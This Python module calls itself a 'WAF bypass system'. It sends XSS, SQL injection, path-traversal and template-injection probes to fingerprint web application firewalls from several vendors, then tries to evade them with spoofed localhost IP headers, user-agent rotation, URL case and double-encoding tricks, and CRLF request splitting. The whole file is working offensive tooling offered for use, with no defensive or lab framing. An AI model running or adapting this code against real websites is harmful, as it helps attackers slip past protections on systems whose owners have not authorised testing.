#!/usr/bin/env python3
"""
🔥 WAF BYPASS SYSTEM - Complete WAF Evasion Module
"""

import asyncio
import random
from urllib.parse import urlparse, quote
from typing import Dict, List, Optional


class WAFBypass:
    """Complete WAF bypass and evasion system"""
    
    def __init__(self):
        # Complete bypass headers for all major WAFs
        self.bypass_headers = [
            {'X-Originating-IP': '127.0.0.1'},
            {'X-Forwarded-For': '127.0.0.1'},
            {'X-Real-IP': '127.0.0.1'},
            {'X-Remote-Addr': '127.0.0.1'},
            {'X-Client-IP': '127.0.0.1'},
            {'X-Host': 'localhost'},
            {'X-Originating-URL': '/'},
            {'X-Forwarded-Host': 'localhost'},
            {'X-Forwarded-Server': 'localhost'},
            {'X-Forwarded-Proto': 'https'},
            {'X-Cluster-Client-IP': '127.0.0.1'},
            {'X-Custom-IP-Authorization': '127.0.0.1'},
            {'CF-Connecting-IP': '127.0.0.1'},
            {'True-Client-IP': '127.0.0.1'},
            {'X-Forwarded': 'for=127.0.0.1'},
            {'Forwarded': 'for=127.0.0.1'},
            {'X-Remote-IP': '127.0.0.1'},
            {'X-Originating-IP': '127.0.0.1'},
            {'X-Forwarded-For': '127.0.0.1, 127.0.0.1'},
            {'Client-IP': '127.0.0.1'}
        ]
        
        # User agents for rotation
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
        ]
    
    async def detect_waf(self, session, url: str) -> Dict[str, any]:
        """Comprehensive WAF detection system"""
        waf_info = {
            'detected': False,
            'type': 'unknown',
            'bypass_methods': [],
            'confidence': 0.0,
            'rate_limit': False,
            'load_balancer': False
        }
        
        # Multiple test payloads for comprehensive detection
        test_payloads = [
            '<script>alert(1)</script>',
            'UNION SELECT 1,2,3--',
            '../../../etc/passwd',
            'eval(String.fromCharCode(97,108,101,114,116,40,49,41))',
            '${7*7}',
            '{{7*7}}',
            '<%=7*7%>',
            'sleep(5)',
            'waitfor delay \'00:00:05\'',
            'OR 1=1--',
            '<img src=x onerror=alert(1)>',
            'javascript:alert(1)'
        ]
        
        for payload in test_payloads:
            try:
                test_url = f"{url}?waftest={quote(payload)}"
                async with session.get(test_url, allow_redirects=False) as response:
                    headers = dict(response.headers)
                    content = await response.text()
                    
                    # CloudFlare detection
                    cf_indicators = [
                        'cf-ray', 'cf-cache-status', 'cf-request-id', '__cfduid',
                        'cf-visitor', 'cf-connecting-ip', 'cf-ipcountry'
                    ]
                    if any(indicator.lower() in [h.lower() for h in headers.keys()] for indicator in cf_indicators):
                        waf_info.update({
                            'detected': True,
                            'type': 'cloudflare',
                            'bypass_methods': ['header_injection', 'case_variation', 'encoding_bypass', 'fragment_bypass'],
                            'confidence': 0.95
                        })
                        break
                    
                    # Sucuri detection
                    sucuri_indicators = [
                        'x-sucuri-id', 'x-sucuri-cache', 'x-sucuri-block',
                        'sucuri-block', 'sucuri'
                    ]
                    if any(indicator.lower() in [h.lower() for h in headers.keys()] for indicator in sucuri_indicators):
                        waf_info.update({
                            'detected': True,
                            'type': 'sucuri',
                            'bypass_methods': ['ip_spoofing', 'user_agent_rotation', 'request_splitting'],
                            'confidence': 0.9
                        })
                        break
                    
                    # AWS WAF detection
                    if response.status in [403, 406]:
                        aws_indicators = ['blocked', 'forbidden', 'aws', 'cloudfront', 'request blocked']
                        if any(indicator in content.lower() for indicator in aws_indicators):
                            waf_info.update({
                                'detected': True,
                                'type': 'aws_waf',
                                'bypass_methods': ['header_injection', 'request_splitting', 'encoding_bypass'],
                                'confidence': 0.85
                            })
                            break
                    
                    # Incapsula detection
                    incap_indicators = [
                        'x-iinfo', 'incap_ses', 'incapsula', 'x-cdn',
                        'incapsula incident id'
                    ]
                    if any(indicator.lower() in [h.lower() for h in headers.keys()] for indicator in incap_indicators):
                        waf_info.update({
                            'detected': True,
                            'type': 'incapsula',
                            'bypass_methods': ['header_injection', 'case_variation', 'user_agent_rotation'],
                            'confidence': 0.9
                        })
                        break
                    
                    # ModSecurity detection
                    if response.status == 406 or any(mod_indicator in content.lower() for mod_indicator in ['mod_security', 'modsecurity']):
                        waf_info.update({
                            'detected': True,
                            'type': 'modsecurity',
                            'bypass_methods': ['encoding_bypass', 'case_variation', 'comment_injection'],
                            'confidence': 0.8
                        })
                        break
                    
                    # Akamai detection
                    akamai_indicators = ['akamai', 'x-akamai', 'ak-', 'ghost']
                    if any(indicator.lower() in [h.lower() for h in headers.keys()] for indicator in akamai_indicators):
                        waf_info.update({
                            'detected': True,
                            'type': 'akamai',
                            'bypass_methods': ['header_injection', 'case_variation'],
                            'confidence': 0.85
                        })
                        break
                    
                    # Load balancer detection
                    lb_indicators = [
                        'x-forwarded-for', 'x-real-ip', 'x-forwarded-proto',
                        'x-forwarded-host', 'x-forwarded-server'
                    ]
                    if any(indicator.lower() in [h.lower() for h in headers.keys()] for indicator in lb_indicators):
                        waf_info['load_balancer'] = True
                    
                    # Rate limiting detection
                    if response.status == 429:
                        waf_info['rate_limit'] = True
                
                await asyncio.sleep(0.2)
                
            except Exception:
                continue
        
        return waf_info
    
    async def bypass_waf(self, session, url: str, waf_type: str) -> Optional[str]:
        """Advanced WAF bypass techniques"""
        bypass_methods = {
            'cloudflare': ['header_injection', 'case_variation', 'encoding_bypass', 'fragment_bypass'],
            'sucuri': ['ip_spoofing', 'user_agent_rotation', 'request_splitting'],
            'aws_waf': ['header_injection', 'request_splitting', 'encoding_bypass'],
            'incapsula': ['header_injection', 'case_variation', 'user_agent_rotation'],
            'modsecurity': ['encoding_bypass', 'case_variation', 'comment_injection'],
            'akamai': ['header_injection', 'case_variation', 'encoding_bypass'],
            'generic': ['header_injection', 'encoding_bypass', 'case_variation']
        }
        
        methods = bypass_methods.get(waf_type, bypass_methods['generic'])
        
        for method in methods:
            try:
                if method == 'header_injection':
                    # Try multiple bypass headers
                    for bypass_header in self.bypass_headers:
                        headers = {**session._default_headers, **bypass_header}
                        async with session.get(url, headers=headers, allow_redirects=False) as response:
                            if response.status not in [403, 406, 429]:
                                return await response.text()
                
                elif method == 'case_variation':
                    # Vary URL case
                    varied_url = self.vary_case(url)
                    async with session.get(varied_url, allow_redirects=False) as response:
                        if response.status not in [403, 406, 429]:
                            return await response.text()
                
                elif method == 'encoding_bypass':
                    # Try different encodings
                    encoded_url = self.encode_bypass(url)
                    async with session.get(encoded_url, allow_redirects=False) as response:
                        if response.status not in [403, 406, 429]:
                            return await response.text()
                
                elif method == 'user_agent_rotation':
                    # Rotate user agent
                    headers = {'User-Agent': random.choice(self.user_agents)}
                    async with session.get(url, headers=headers, allow_redirects=False) as response:
                        if response.status not in [403, 406, 429]:
                            return await response.text()
                
                elif method == 'request_splitting':
                    # HTTP request splitting
                    split_url = url.replace('?', '%0d%0a%0d%0a?')
                    async with session.get(split_url, allow_redirects=False) as response:
                        if response.status not in [403, 406, 429]:
                            return await response.text()
                
                await asyncio.sleep(0.5)  # Delay between attempts
                
            except Exception:
                continue
        
        return None
    
    def vary_case(self, url: str) -> str:
        """Vary URL case for WAF bypass"""
        parsed = urlparse(url)
        path = parsed.path
        
        # Randomly vary case in path
        varied_path = ""
        for char in path:
            if char.isalpha():
                varied_path += char.upper() if random.choice([True, False]) else char.lower()
            else:
                varied_path += char
        
        return f"{parsed.scheme}://{parsed.netloc}{varied_path}?{parsed.query}"
    
    def encode_bypass(self, url: str) -> str:
        """Encode URL for WAF bypass"""
        parsed = urlparse(url)
        path = parsed.path
        
        # Multiple encoding techniques
        encoding_techniques = [
            lambda x: x.replace('/', '%2f'),
            lambda x: x.replace('.', '%2e'),
            lambda x: x.replace('?', '%3f'),
            lambda x: x.replace('&', '%26'),
            lambda x: x.replace('=', '%3d'),
            lambda x: x.replace('/', '%2F'),  # Uppercase
            lambda x: x.replace('/', '%252f'),  # Double encoding
        ]
        
        # Apply random encoding
        technique = random.choice(encoding_techniques)
        encoded_path = technique(path)
        
        return f"{parsed.scheme}://{parsed.netloc}{encoded_path}?{parsed.query}"
    
    def get_bypass_headers(self) -> Dict[str, str]:
        """Get random bypass headers"""
        return random.choice(self.bypass_headers)
    
    def get_random_user_agent(self) -> str:
        """Get random user agent"""
        return random.choice(self.user_agents)